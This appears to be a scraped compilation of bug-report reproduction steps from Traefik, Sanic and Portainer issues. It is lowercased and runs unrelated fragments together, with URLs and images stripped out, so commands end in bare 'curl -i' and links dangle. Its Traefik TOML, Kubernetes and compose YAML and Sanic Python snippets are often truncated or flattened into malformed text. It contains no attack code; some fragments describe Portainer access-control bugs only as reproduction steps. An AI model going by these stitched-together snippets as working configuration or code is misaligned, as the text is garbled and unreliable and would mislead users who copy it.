[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/traefik/example.domain.com.crt" keyfile = "/etc/ssl/traefik/example.domain.com.key" [acme]
email = "some.fake@email.com"
storage = "/etc/traefik/acme/acme.json"
entrypoint = "https"
acmelogging = true
ondemand = false
onhostrule = false [[acme.domains]]
main = "subdomain.multi.example.domain.com"
``` upon starting traefik properly fetched le crt for `subdomain.multi.example.domain.com` and saved to `acme.json` file
next, i started two services, one with rule: `host:testapp.example.domain.com` and other one with rule: `hostregexp: multi.example.domain.com, {subdomain:[a-z]+}.multi.example.domain.com`
created a kubernetes ingress that attempts to add a prefix to a path.
apiversion: extensions/v1beta1 kind: ingress metadata: name: notes-ui namespace: dev annotations: traefik.frontend.rule.type: "addprefix: /notes"
i tried to use traefik as an ingress controller in an rbac restricted kubernetes cluster with multiple namespaces.
i am trying to integrate traefik with rancher using the configuration file to proxy containers
as you can see i kept my configuration as simple as possibile, basing on the one provided in the documentation.
this issue is related to #1218 but for everyone of them seems to have solved; of course this is not my case :d the rancher version i'm currently using is 1.5.9 (stable).
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80"
address = ":8080"
domain = "xxx"
exposedbydefault = true
endpoint = " "
accesskey = "xxx"
secretkey = "xxx"
i upgraded to 1.3.0-rc1 using consul backend
mounted /var/run/docker.sock to the container.
boot a container with these labels: labels: traefik.docker.network: "inverseproxy_shared" traefik.enable: "true" traefik.frontend.passhostheader: "true" traefik.frontend.rule: "host:gitlab.example.com}" traefik.port: "80"
i've upgraded my docker swarm mode cluster to 17.04-ce
enabled `compress = true` on an entrypoint
i have two backends, one serving gzipped content (with the correct "content-encoding: gzip" header), the other serving uncompressed content
before enabling compression in traefik, the content from both backends is proxied as is.
attempted to start traefik with a connection to marathon (dc/os)
the version of the dc/os cluster is 1.9 (enterprise)
specified --acme=false, along with other acme parameters.
set up traefik with rancher backend for a container with net=host.
rebase a pr.
i created the docker service in `--endpoint-mode dnsrr` with 3 replicas as the backend service
the frontend's rule is `pathprefix`
if i remove the `--endpoint-mode dnsrr` which means that the endpoint mode will be in vip, it will automatically register the vip in the backend's url.
just try to run with following command ``` docker run -d -p ${httpport}:${httpport}-p ${webport}:${webport}-p ${httpsport}:${httpsport}-v /sources/traefik:/etc/traefik:z -v /var/run/docker.sock:/var/run/docker.sock:z --name traefik --restart=always traefik
deploy a service and ingress as per the documentation example.
configured 2 configuration backends: - consulcatalog - kubernetes
we run two tasks / services to test this setup
one as docker container and a second one as universal containerizer
{ "container": { "type": "docker", "docker": { "forcepullimage": true, "image": "hub.binky.domain.xyz/trashcan/fixed:0.1", "privileged": false, "network": "user", "portmappings": [ { "containerport": 80, "protocol": "tcp", "name": null, "labels": null } ] } }, "cpus": 0.1, "id": "/traefik/docker-1", "instances": 1, "minimumhealthcapacity": 1, "acceptedresourceroles": ["*"], "mem": 128, "labels": { "haproxy_0_vhost": "docker-1.traefik.binky.domain.xyz", "haproxy_group": "internal" }, "ipaddress": { "networkname": "my-calico-net", "labels": { "app": "test", "group": "development" } }
``` universal containerizer:
{ "container": { "type": "mesos", "docker": { "forcepullimage": true, "image": "hub.binky.domain.xyz/trashcan/fixed:0.1", "privileged": false } }, "cpus": 0.1, "id": "/traefik/mesos-1", "instances": 1, "minimumhealthcapacity": 1, "acceptedresourceroles": ["*"], "mem": 128, "labels": { "haproxy_0_vhost": "mesos-1.traefik.binky.domain.xyz", "haproxy_group": "internal" }, "ipaddress": { "networkname": "calico-net-1", "labels": { "app": "test", "group": "development" } }
request an https page.
"login" via web page which does request to irc.xxx.xxx/weechat (websocket upgrade)
install service file from:
i have removed a key `/traefik/backends/servers/server1/url` but `/traefik/backends/servers/server1` remained
automatically generated a new certificate through acme
first, i tested my conf : it worked
then, i tried
it didn\'t work, i got this error from google : the requested url /branding/googlelogo/2x/googlelogo_color_12 .png was not found on this server it seems that traefik removed "/images/" from the url
if i tried another url with double slashed but inside the url, it worked :
i created simple service as
```shell docker service create \\ --name=visualizer \\ --network=proxy \\ --constraint=node.role==manager \\ --mount=type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ --label traefik.visualizer.port=8080 \\ --label traefik.visualizer.network=proxy \\ --label traefik.visualizer.frontend.rule=host:visualizer.traefik \\ --label traefik.visualizer.frontend.entrypoints=http,https \\ manomarks/visualizer:latest
i use traefik as front of differente container
i have a container
i have a container jenkins who fail, and container is stopped quickly
in this case traefik show this url in backend :
![image](
setup the marathon backend successfully with acme support and then tried to move its config into zookeeper.
created traefik.toml configmap, and run `storeconfig` as a k8s job.
i try to access my application through traefik with the url ` `
the following docker command is used to run traefik ```
sudo docker service create \\ --name traefik \\ --replicas=1 \\ --constraint=node.role==manager \\ --publish 80:80 --publish 8080:8080 \\ --mount type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock \\ --network swarm-demo-overlay-net \\ traefik:v1.1.2 \\ --docker \\ --docker.swarmmode \\ --docker.domain=abc.com \\ --docker.watch \\ --loglevel=info \\ --traefiklogsfile='/app/logs/traefik.log' \\ --accesslogsfile='/app/logs/access.log' \\ --web ```
the service is a meteor app that communicates through websockets/ddp.
i have load tested it with meteor-down and after a few hundred connections traefik on websockets goes totally unresponsive
can not load anything else until i scale services (both) to 0 and back up
load testing on pure http endpoints using apache benchmark worked without hickups
removed traefik and served the service directly on port 80, load tested with meteor down again and it worked fine
tried with `traefik.backend.loadbalancer.sticky=false` and `traefik.backend.loadbalancer.swarm=true`, same thing
not sure what else to try, thanks for any insight.
i attempted to access a zoneminder stream through traefik which was configured to use auto+mpeg streaming mode (autodetecting if streaming is available and if yes, using mpeg)
test reload rules when rules.toml file is changed
i have created a overlay network for traefik however i have added option secure ( -opt encrypted ) from docker docs
point backend b5 to another server (the old server did also host the load balancer but on a different port).
run traefik inside a windows nanoserver container to communicate with a windows docker engine ```
docker build -t traefik .
docker run -it -v c:$(pwd):c:/etc/traefik -v c:/users/vagrant/.docker:c:/etc/ssl -p 8080:8080 -p 80:80 traefik --docker.endpoint=tcp://172.31.80.1:2376 --loglevel=debug
try to access the webui via traefik frontend.
we deployed a new service with the following labels
"labels": { "traefik.frontend.entrypoints": "http", "traefik.frontend.rule": "host:subdomain.example.com", "traefik.port": "80" }, ```
but forgot to publish a port for the service using the `-p` option to `docker service create`
i'm trying to set up a kubernetes ingress that matches all subdomains of my cluster's tld that don't have other ingresses with an explicit host match
for example, if i have an ingress for the host "foo.example.com", then i want to send requests for that to service "foo"
but if a request comes in for "bar.example.com", or any other subdomain that doesn\'t have its own ingress, i want the request to go to a default backend "catchall"
this is what i tried originally: ``` yaml
kind: "ingress"
apiversion: "extensions/v1beta1"
metadata: name: "catchall"
spec: rules: - host: "*.example.com" http: paths: - backend: servicename: "catchall" serviceport: 80
``` after creating this ingress, the traefik dashboard shows one frontend for "*.example.com" with route "*.example.com" and rule "host:*.example.com"
one backend for "*.example.com" shows up with all the correct endpoints for the "catchall" kubernetes service
however, i get a 404 when making a request that i'd expect to work: ``` bash
$ curl -i
http/1.1 404 not found
content-type: text/plain; charset=utf-8
x-content-type-options: nosniff
date: thu, 26 jan 2017 23:07:21 gmt
content-length: 19 404 page not found
``` i then tried an ingress using a default backend, which should do what i want, according to the kubernetes documentation: ``` yaml
kind: "ingress"
apiversion: "extensions/v1beta1"
metadata: name: "catchall"
spec: backend: servicename: "catchall" serviceport: 80
``` but this results in no frontends or backends showing up in the traefik dashboard
finally, i tried a variation of the first ingress, but left out the host: ``` yaml
kind: "ingress"
apiversion: "extensions/v1beta1"
metadata: name: "catchall"
spec: rules: - http: paths: - backend: servicename: "catchall" serviceport: 80
``` the traefik dashboard shows an unnamed frontend with an empty route and an empty rule
an unnamed backend shows up with all the endpoints for the "catchall" kubernetes service
my test request then works as i'd expect: ``` bash
$ curl -i
http/1.1 302 found
``` is it intentional that the first two ingresses i tried didn't work as expected? am i misunderstanding something? or is this a problem with traefik and/or kubernetes? thanks very much!
started two `nginx` docker containers with the following labels:
```yml traefik.port=80 traefik.backend=lunawebsite traefik.frontend.rule=host:luna.liefdevolafscheid.nl traefik.port=80 traefik.backend=luna-redirect traefik.frontend.rule=host:luna-liefdevolafscheid.nl
``` (mind the dot versus dash in the hostname.)
i start an nginx container, with some static files in web root
i export the port, and test :
- download a 1.3gb file on the expose port (without traefik)
- download same file by traefik on configured frontend
this is the script i used to create the etcd and traefik containers ```shell
docker stop `docker ps -a | grep traefik| awk '{print $1}'`;
docker stop `docker ps -a | grep etcd| awk '{print $1}'`; docker rm `docker ps -a | grep traefik| awk '{print $1}'`;
docker rm `docker ps -a | grep etcd| awk '{print $1}'`; docker run --name etcd -p 2379:2379 -p 4001:4001 -p 7001:7001 -p 2380:2380 -d -t elcolio/etcd -name etcd0 \\ --advertise-client-urls ' \\ --listen-client-urls ' \\ --listen-peer-urls docker run \\ --link 'etcd:etcd' \\ --name traefik-config \\ -d \\ -v $pwd/traefik.toml:/etc/traefik/traefik.toml \\ traefik:v1.0.3 storeconfig --loglevel=debug; docker run \\ --link 'etcd:etcd' \\ --name traefik \\ -d \\ -p 8080:8080 \\ -p 80:80 \\ -v $pwd/traefik.toml:/etc/traefik/traefik.toml \\ traefik:v1.0.3 --loglevel=debug; docker logs traefik;
i have configured a registry service in my cluster it's running under its own network and i have another service that i'm using to add auth to it
basically the configuration is something like: ```
docker \\ network create --driver overlay registry docker \\ service create --name registry \\ --reserve-memory 100m \\ --network registry \\ --publish 5000:5000 \\ -e registry_storage_delete_enabled=true \\ registry:2 docker \\ service create --name nginx-registry \\ --network traefik-pub \\ --publish 5001:443 \\ --network registry \\ --container-label com.docker.stack.namespace=ops-infrastructure \\ --label com.docker.stack.namespace=ops-infrastructure \\ --label traefik.tags=public \\ --label traefik.docker.network=traefik-pub \\ --label traefik.backend=registry \\ --label traefik.frontend.entrypoints=https \\ --label traefik.frontend.rule=host:registry.softonic.one \\ --label traefik.port=80 \\ localhost:5000/basi/nginx-registry:v0.1.0
this second nginx is configured to work under the 80 port, which is not publicly accessible and it's routed through traefik, that adds the tls layer thanks to letsencrypt.
on other hand i've added the same certificates temporally as a test in my nginx image to check if it works directly (mapping an elb from tcp:443->tcp:5001)
start, stop and removed docker containers using docker-compose config with 4 services
all services have there labels:
```yml labels: - traefik.enable=true - traefik.docker.network=traefik-proxy - traefik.port=80 - traefik.frontend.rule=host:removed.com
``` two also have `pathprefix` rule
i was doing some development so i used docker-compose to rebuild and restart the services quite a bit.
response.cookie["my-cookie"]["max-age"] = 10.0 # max-age is set to 0
response.cookie["my-cookie"]["max-age"] = 10.5 # max-age is set to 0
response.cookie["my-cookie"]["max-age"] = "ten" # max-age is set to 0
response.cookie["my-cookie"]["max-age"] = "10" # max-age is set to 10
response.cookie["my-cookie"]["max-age"] = 10 # max-age is set to 10
`request.url_for("static", name=\'static\', filename="badge.png")`
from sanic import sanic
from sanic.response import html app = sanic() # @app.route('/endpoint', strict_slashes=true)
@app.route('/endpoint/', strict_slashes=true)
async def endpoint(request): return html('ok') @app.route('/')
async def index(request): # print(request.app.router.routes_all) return html(\'<a href="\' + request.app.url_for(\'endpoint\') + \'">endpoint</a>\') if __name__ == \'__main__\': app.run(port=8000)
from sanic import sanic
from sanic.log import logger
from sanic.response import text app = sanic() @app.listener('before_server_start')
async def setup(app, loop): logger.info('info') @app.get('/')
async def test(request): return text('hello world') if __name__ == '__main__': app.run()
there is no any log/output now.
from sanic import sanic
from sanic import blueprint
from sanic.response import json blueprint = blueprint("api_blueprint") @blueprint.route("/")
async def test(request): return json({"hello": "world"}) app = sanic() app.blueprint(blueprint) def main(): app.run(workers=2)
go to settings
click on use custom logo
see the the url input for the logo renders underneath the telemetry setting rather than under the logo setting
![image](
select all containers
select criteria stop
perform delete
ragedy all containers have been deleted
- swarm with 1 manager and 1 worker
- 5 stacks with active services (incl portainer stack)
- 2 stacks without services (placeholders created in portainer but with services deleted) steps: 1
have portainer 1.24.1 on docker swarm with the aforementioned stack setup.
upgrade to portainer-ce 2.0.0
log in and observe home page - "primary" endpoint is listing 5 stacks:
![portainer-home](
select the primary endpoint and observe the dashboard - 7 stacks:
![portainer-dash](
select stacks list - only 2 stacks are shown (portainer stack and one of the empty placeholders):
![portainer-200-stacks](
downgrade to portainer 1.24.1 and go to stacks - all 7 are visible now:
![portainer-1241-stacks](
go to create custom template view
upload a compose file
click create button `failure unable to create custom template`
have docker swarm with multiple nodes.
have a fuse mounted network storage
i used a glusterfs cluster and a docker volume plugin that uses `mount -t glusterfs server1://docker0 /mnt/volumes/docker0` to mount /data 3
deploy a portainer compose stack using a node.hostname=node1 constraint
setup users, groups and endpoints
redeploy the compose stack, changing the node.hostname to a different node
create account in your self-hosted repository having specials characters in password: `some_.-?password`
add repository into `registries`
go to images and try to pull some image.
1. visit
2. put id and password
4. close window
5. visit
6. the admin user is already logged in
go to add registry view
add a quay registry with your username and password
tag an image with this registry and try to push
get error 404
![image](
enable load balancer usage in cluster setup
create a new application and expose it over an external load balancer, set port 1 to 80 -> 80 tcp and port 2 to 8888 -> 8888 udp
from the "stacks" tab, copy the contents of the attached file into the editor
provide the stack name "graylog"
leave all other settings at default.
click "deploy the stack"
observe error flashing in upper right corner along with failure to deploy
upgrade k8s deployment to use portainer image 1.22.1
specific to chrome
go to settings
change snapshot interval to `5month`
click save settings
see go panic in portainer logs
install portainer 2.0.0.
disable the option "allow the collection of anonymous statistics" in the settings.
refresh the page.
check the network tab in devtools.
see a request for being made.
select a stack
see the container listing under any service
try deploying any simple docker-compose.yaml file with portainer 2.0's kompose feature.
open a container view
click on logs
click on "copy"
paste into required app
compare log window output with pasted output
back to container log view - click a specific line
click "copy selected lines"
paste those into required app
note lack of trailing comma
go to endpoint details view of a local kubernetes endpoint
see tls settings and information about docker tls
![image](
login with your normal user, no changes.
login with you normal user but put one random letter to uppercase
have a look under users, you have new ones with restriced rights
set up a docker using image `portainer/portainer-ce:latest`
go to settings > authentication > authentication method "oauth"
fill in the urls as provided by keycloak
open an incognito tab and go to portainer, log in with oauth
get redirected to the log in portal
get redirected back to portainer, authentication failed
i use docker to launch portainer/portainer-ce and portainer/agent
portainer server and agent are on different swarms.
that is, portainer-ce and agent are all on different swarms
i tested with an environment where portainer-ce and agent were on same swarm,
and here it worked as expected, stack was created as fully controllable.
go to 'endpoints'
go to 'add endpoint'
click on 'agent'
add 'name' and 'endpoint url'
press 'add endpoint'
"failure, unable to get endpoint type"
deploy stack with `portainer/portainer:1.24.1` image
login and init admin
deploy stack again with `portainer/portainer-ce` to update it
login and see version number missing
log out and then login and see version is now correctly shown
unsure how to reproduce, could be network related
turned on ldap and tested okay
next day logged in via ldap, got errors above opening endpoint from dashboard
turned off ldap, logged out
logged back in with internal admin account
tried to open endpoint in dashboard again, same errors
login to portainer
select the desired endpoint and go to "containers"
click on "add container"
under "image configuration" click on "advanced mode"
enter any image from the nvidia container registry (i tried with `nvcr.io/nvidia/tensorflow:20.08-tf1-py3`)
click on "deploy the container"
go to create network
see driver input is blank instead of saying `select a driver`
![image](
deploy latest portainer stack on vm on remote host
vpn to remote host, access portainer in browser and init admin
go to images view and click import, then choose image tar (its important that this is one that doesn't already exist on host else it wont fail) and click upload
see button shows uploading image for a while but then reverts to `upload`
see error thrown in console
![image](
create a new stack with the content:
version: '2'
services: nginx: container_name: nginx-test image: nginx:1.19.2
check that the container `nginx-test` is running
edit the stack and change the name to `nginx-test2`
press `update the stack`
you now see that the container is still named `nginx-test` - portainer version: up to the latest
- docker version (managed by portainer): various
- platform (windows/linux): linux
create volume outside portainer on node3 called test_test
deploy stack called test that is constrained to node2, that references volume test ```
version: '3'
services: test: image: nginx volumes: - test:/data deploy: placement: constraints: [node.hostname == swarm-node2]
volumes: test:
update stack to be constrained to node3
change ownership of stack to restrict to a user
see ownership not changed on node3 volume and is instead applied to node2 volume
also see that volume on node2 is still apparently in use by stack, when stack is now using volume on node3
![image](
ensure portainer is not running
start running "docker events --filter type=node" in a terminal window
in another window, start or stop a docker swarm service (not portainer), i.e
traefik or anything else.
the docker events will show an event on the node where the terminal stops or starts (a node event, not a service event)
start the portainer stack (portainer + agents globally on every node of the swarm)
start or stop a docker swarm service again (not portainer)
the docker node event log will now not show any updates.
stop the portainer stack
start or stop a docker swarm service again.
now the docker node event log will show updates
deploy a container with multiple env vars via docker run
inspect the container in portainer and click the drop down for env vars
![image]( 3
see they are not rendered and an error is thrown in browser console.
![image](
run portainer with `--no-auth`
try editing a container
create a config in swarm with a binary file
browse to any service view, or the configs view and get error `unable to retrieve configs` and in the console: ```
vendor.d1359a0211f4f67c952f.js:47 urierror: uri malformed at decodeuricomponent (<anonymous>) at new r (main.d1359a0211f4f67c952f.js:1) at main.d1359a0211f4f67c952f.js:1 at array.map (<anonymous>) at main.d1359a0211f4f67c952f.js:1 at vendor.d1359a0211f4f67c952f.js:47 at vendor.d1359a0211f4f67c952f.js:47 at c.$eval (vendor.d1359a0211f4f67c952f.js:47) at c.$digest (vendor.d1359a0211f4f67c952f.js:47) at c.$apply (vendor.d1359a0211f4f67c952f.js:47)
go to #/containers
click on 'your container' and logs
change the lines number, you will find difference logs(it's difference time!!!)
create network test on node2
try to deploy template with this network
see error `could not find network test` obviously this is because the network doesn't exist on the node the template is being deployed on
download image goacme/lego:latest
create container and run - note that default entry point will be '/usr/bin/lego'
wait for container to stop
remove entry point and change command to something else (i.e
relevant lego options)
deploy the container
note it's worked.
edit the container and deploy the container again (checking entrypoint still shows blank before clicking deploy)
wait for container to stop
edit the container - note entry point has returned 10
clear entry point and deploy the container again 11
wait for container to stop
edit the container, add and remove a space char in (the still appearing blank) entry point - deploy container
behaviour will be per 5 and 10
follow install instructions to download and run portainer from website, run the commands, and error appears after download is finished and it tries to start container
go to create service view and select the ingress network
![image]( 2
click on create the service and see it successfully creates
observe the service never actually runs the task as the network cannot be joined
go to '/#/services'
click on 'bottom-right corner of services checkbox'
create a macvlan network configuration
set all params (subnet, gateway, range and excluded address(es) - set the first address in range/scope as excluded
save the network
create a macvlan network (creation)
use the defined configuration
add a container to the network it will get the first address, which should be excluded
log into portainer
go to 'images'
click on 'import'
click on 'select file'
select a node (doesn't matter, as this fails for manager or agent)
click 'upload'
wait anywhere from 30 seconds to 5 minutes and you'll get the error ## technical details:
portainer version: 1.23.2, 1.24.0 - note: i will try this new version on an ubuntu sandbox to see if same issue persists * docker version (managed by portainer): 19.03.8 * platform (windows/linux): redhat linux 7.7 * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `sudo docker stack deploy --compose-file=portainer-agent-stack.yml portainer` portainer-agent-stack.yml version: \'3.2\' services: agent: image: portainer/agent volumes: - /var/run/docker.sock:/var/run/docker.sock - /var/lib/docker/volumes:/var/lib/docker/volumes networks: - agent_network deploy: mode: global placement: constraints: [node.platform.os == linux] portainer: image: portainer/portainer command: -h tcp://tasks.agent:9001 --tlsskipverify ports: - "9000:9000" - "8000:8000" volumes: - portainer_data:/data networks: - agent_network deploy: mode: replicated replicas: 1 placement: constraints: [node.role == manager] networks: agent_network: driver: overlay attachable: true volumes: portainer_data: * browser: brave 81.0.4044.138 (primary that we use for ad blockers, based on chromium) chrome 83.0.4103.97 firefox 77.0.1 ms edge 83.0.478.45 we are seeing the same behavior on all of the above browsers ## additional context
my remote connection via vpn is uploading in the 12mbps range consistently (today) - so latency is a factor
people inside the office on 1gbps lan connections are seeing the same issue - memphis, tn to little rock, ar, so latency is still a factor albeit reduced from remote uploads
the issue does not present when performed locally - which takes roughly 5 seconds
only on portainer installs on remote vms
docker load --input x.tar for the image works without issue
this is isolated to portainer and specifically just the agent as standalone works fine on remote vms
we were trying out the agent approach in our dev systems to centralize loading, but have halted that approach due to this bug.
go to images view and try to pull `codait/max-object-detector:arm-arm32v7-latest`
see failure unable to pull image
see errors in console and in response
![image](
![image]( **edit:** after pulling via cli, deleting it and pulling via portainer again it pulled successfully
so there must be an error in our retry logic if the pull is slow (its a 1.68gb image) maybe it times out and messes up the pull causing the json and js errors
go to 'app templates'.
click on '+ add template'.
click on 'swarm stack' to select it as template type.
scroll down to 'environment'.
click on '+ add variable'
click on 'select (choose value from list)' to select it as variable type.
fill all required fields.
click on 'create the template'.
click on just created template.
fill required fields.
click on 'deploy the stack'.
click on just created stack.
click on 'editor' tab.
scroll down to 'environment'.
see that "select" variables aren\'t there.
go to ` #/endpoints/`
![image](
go to registries view as an endpoint admin and try to browse a registry
see that you get the configuration screen and that you cannot test or configure it
![image](
create a stack (with no volumes) as admin called `test`
create a volume as a endpoint admin called `test_test`
update the `test` stack as the endpoint admin to reference a volume called `test`
see that a new volume is created called `test_test` (on a different node as the existing volume) and that the endpoint admin now owns this, as well as the `test` stack
go to templates view as a non-admin
click on a template that requires a volume to be mounted
type in an admin owned volume in the volume type-ahead then deploy
see that the template deploys and the container has the admin owned volume mounted
add multiple gitlab projects as registries
![image]( 2
click manage access beside one and try to assign access for your team
see error `failure a registry is already defined for this url`
![image](
deploy a stack with a secret (that doesn't exist), or with the disable stacks setting on (in v1.24.1) or with the same name as a stack already in the db
see it instantly fail with no error message
try deploy a stack from stacks view and enter this stack (with a space before version) in the editor ``` version: '3.4'
services: test: image: nginx
see that the syntax error is behind other elements
![image](
go to #/images/import
click on 'select file'
select any invalid file
click on 'upload'
a banner occurs saying "image successfully uploaded" but in reality an error occured
the image is not listed under images
add a gitlab registry and browse it
click on a repository and click delete this repository
see you are redirected back to the repositories list and there is still your repo with 0 tags
![image]( 4
click on it and see failure unable to retrieve tags error
![image](
deploy a stack against stack api endpoint ` `
with this content:
{ "name": "test", "swarmid": "jhhl3jj3h5jh34jh7356735676nn", "stackfilecontent": "version: \'3\'\ services:\ test:\ image: busybox", "env": []
see in the portainer ui ownership of the stack is private with no assigned owner
![image](
(with non-administrator user)
start a new container without access control
create a new network (bridge) without access control
open the newly created container in portainer, scroll to the bottom and select the new network
click `join network`
create a non-admin user
login with the non-admin user
create a volume
notice you cannot browse
notice that if you use a direct link to the browse interface, you can actually browse.
go to images
select a fresh image (lik nginx:latest)
tick it, then click "export" in portainer logs, and in chrome:
failed to load resource: net::err_failed
add a gitlab registry
browse it and see the configuration required screen
enter a valid configuration, test and save
browse the registry and then browse another view
browse the registry again and see you are again asked to enter a valid configuration.
add a new endpoint with edge agent type
go to endpoints list page
scroll down to the new added endpoint
see 'localhost:0'
go to 'container statistics'
set **refresh rate** to **1 seconds**
the first few requests succeed, but wait for more seconds
create container with jellyfin/jellyfin:10.4.5 or older.
see entrypoint of running container (copied from information on portainer): `/bin/sh -c dotnet /jellyfin/jellyfin.dll --datadir /config --cachedir /cache --ffmpeg /usr/local/bin/ffmpeg`
duplicate/edit container once running and change image to jellyfin/jellyfin:10.5.0
see the entrypoint from newly instanced container
entrypoint should be: `./jellyfin/jellyfin --datadir /config --cachedir /cache --ffmpeg /usr/local/bin/ffmpeg`
entrypoint is actually identical to substep 1
deploy a compose file to a docker swarm using portainer using some specific name.
remove the stack using the portainer stacks ui.
deploy a compose file using `docker-compose up` using the same stack name.
go to the portainer stacks ui and see that the stack is listed as total control, and that portainer now shows the incorrect compose from the previous managed deployment.
install portainer on windows server 2019 using image `portainerci/portainer:fix3568-bump-go-winio-lib-windows1809-amd64`
open image page of (local) endpoint
see empty list
deploy portainer
try to instantiate the local endpoint
get error during connect
![image from ios](
hide a container
go to "images"
see unused images
...etc etc...
-go to container details
- click recreate container and check pull latest image
- somehow break your host internet connection while docker pulling image
execute 'docker network create traefik_proxy' on cli --> i've got this id: 78f00e2dd56ea8fd9113139ff59ce8f161d0bbe98b89ae4935d76ad09b988dc0 2
log in to portainer as administrator
click on 'stacks' in the navigation and create a new stack
* name: traefik
* build method: web editor
* docker-compose file:
version: '2' services: traefik: image: traefik:latest restart: unless-stopped ports: - 80:80 - 443:443 - 8002:8080 networks: - traefik_proxy volumes: # traefik needs the docker socket, to explore new container on your docker-host - /var/run/docker.sock:/var/run/docker.sock - /home/pi/traefik/traefik.toml:/traefik.toml - /home/pi/traefik/acme.json:/acme.json container_name: traefik
networks: traefik_proxy: external: true 4
click on 'deploy the stack'
see bug description.
deploy stack called test
see that it deploys fine
remove stack and see that it removes it correctly
deploy stack called test again and get error failed to deploy
go to stacks view and see that it was deployed and ownership is set to private with no owner
![image]( this is the stack i used which includes a private image, credentials for dockerhub were set in registries view
version: '3'
services: test: image: wconquest/test
deploy a service with a label (not as part of a stack)
go to services view and search for the label
see the service shown but not it's related tasks
![image](
go to stack details view of a stack and make some changes
click the update stack button
see error display behind another element
![image](
go to 'stacks'
click on '+ add stack'
enter a name, e.g
'alpinetest'
enter the below compose file into the web editor ```yaml
services: alpine: ports: - "2001:db8::1:80:80/tcp" image: alpine:latest network_mode: bridge
replacing ` - "2001:db8::1:80:80/tcp"` with ` - "192.0.2.1:80:80/tcp"` results in a successful deployment
both versions result in a successful deployment when using docker-compose.
have existing instance with previously configured ad & rbac
setup native ldap, create a user e.g
`ldap`and a group e.g
`dev` and assign them to the group
configure portainer for native ldap with auto-provisioning
log in with native ldap user and see no endpoints
log out and login as admin
create matching team in portainer as the one defined in native ldap server
assign team as endpoint admin
log in as user and see endpoint then click endpoint
receive error
![image]( `get /api/endpoints/1/docker/_ping` results in:
{ "message":"permission denied to access endpoint", "details":"authorization required for this operation"
`get /api/endpoints/1 params:{"status":2}` results in:
{ "message":"access denied", "details":"authorization required for this operation"
``` - deleting user from portainer and logging in again resolves the issue
- adding a new endpoint resolves the issue
- adding a new ldap user and group to ldap server and following above steps causes issue again across both endpoints
- new user auto-provisioned => team created & given access to endpoint in portainer => bug
- team created & given access to endpoint in portainer => new user auto-provisioned => fine
- team created in portainer => new user auto-provisioned => access assigned to endpoint => fine
- does not occur with rbac disabled
- also occurs against endpoint-groups with rbac
go to container create view
select a container network from the dropdowns
switch back to bridge network
click deploy
![image](
execute "docker run -d -p 8000:8000 -p 192.168.8.3:9000:9000 -p 110.147.20.13:9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /mnt/raid/links/portainer:/data portainer/portainer" in the console
goto portainer, edit the newly created container
see error: only one -p item is shown
configure ad, enable rbac & assign a user as endpoint admin
use the software 3
see requests fail intermittently with access denied (403) ![image](
![image](
![image](
![image](
![image](
![image](
create volume
create container with binding volume
deplay the container
go to 'container list'
click on '+ add container'
in the registry form, select gitlab registry
in the image form, type the image tag
: no such image: registry.gitlab.com/mygroup/mysubgroup/myproject/latest:latest
create a stack outside portainer
give a non-admin ownership of a service in the stack
login as that user and see the stack is present
remove the stack, which will also remove all releated resources to the stack
have a service (from an external stack) owned by a non-admin user or team.
trying to view container logs or performing exec into a container of that service results in "access denied to resource".
go to endpoints
have more than one endpoint.
click on any column header except actions.
install a fresh copy of portainer.
configure ldap settings *without setting* a reader dn nor password.
verify that you can authenticate to an ldap server using anonymous access
notice that you can't use the check ldap configuration here without a reader dn/password
instead you must add a valid ldap user to portainer and re-login to portainer using it.
go back to ldap settings and use a valid reader dn and password.
verify that you can still authenticate using ldap.
go back to ldap settings and set the reader dn and password back to empty.
verify that you can't authenticate anymore using ldap when it should
the reason is that the previous reader password is not set back to empty and thus portainer is trying to connect to ldap using an empty reader dn and the previous reader password.
from now on, there is no way to set the reader password back to empty and go back to using anonymous ldap access
the only way is to wipe the settings storage (and loose all settings).
add ad configuration to portainer with autoprovisioning
log in as pre defined ad user e.g
`user1` and see that they have access to no endpoints
define the ad group in portainer that user is in e.g
assign the team to an endpoint
log in as user1 and see they have endpoints listed
created a new user e.g
user2 in ad & assigned them to dev team within ad
login to portainer and enable rbac
log in as user1 and click on endpoint they can see
get error `unable to update endpoint status`
pull same image on multiple nodes
get multiple auto suggestions
go to a container
click the users drop down when restricting the resource (with more than 5 users present) 3
see the list of users show under the image input
as an administrator go to settings>users and add a new user.
as an administrator go to settings>users>teams and add a new team, selecting the new user as a team leader.
log out, and log in as the user.
visit the users, teams and roles screens and attempt to use their functions.
assign a user to a team with the helpdesk role.
assign them to another team with the standard user role.
see that the user has `read-only` abilities.
restrict a stack to an rbac user
login as any other endpoint-admin or helpdesk user that does not have the stack assigned to them and see it is shown as restricted to administrators.
as an endpoint administrator, browse to the services view and remove a service that is related to a stack.
browse to the stacks view and see that the stack related to the service that was just deleted is missing.
login as an administrator and see that the stack is still visible.
1.set a total control stack as owned by administrators
log in as endpoint admin or helpdesk user
see that it shows as limited stack
go to a container as an endpoint admin or standard rbac user
click on attach
see that portainer hangs on `attaching..`
![image](
restrict a resource to a non-admin user e.g
`container to helpdesk user eve`
login as an endpoint-admin and try to delete this container
recieve error `failure access denied to resource`
have rbac enabled and assign some users roles.
disable rbac
login as the users and see they still have the abilities from their previous rbac role.
assign an rbac user access to an endpoint (e.g
adam as endpoint-admin)
log in as adam and see you have the option to console into a container
![screenshot from 2019-11-06 10-36-07]( 3
refresh the browser and see that you no longer have any abilities (effectively read-only user)
![screenshot from 2019-11-06 10-36-20]( 4
log out and back in and see you have the abilities back
change image version from 1.22.1 to 1.22.2 in docker-stack.yml and update the stack.
create a container image with an healthcheck (type `cmd-shell`)
run a container from that image
update the image, changing healthchecks parameters (i tried changing `cmd-shell` in `cmd`)
re-create (or edit) the container
the new container will use old configurations for healthchecks.
go to app templates view
click on cockroachdb app template
give the stack a name and click deploy
see deployment error
![image](
deploy 1.22.0 with rbac enabled
grant access to an endpoint for a user who is not admin
upgrade to 1.22.1 from 1.22.0 (which is working properly with rbac)
the members granted via rbac can not login to portainer anymore.
go to '/#/images'
fill the image name and choose the right registry 3
click on 'pull the image' and then wait for the operation 4
at the end the there is a "green" message saying the image is successfully pulled 5
the image is not displayed in the list of the images
check the docker log /var/log/daemon.log
go to create container view
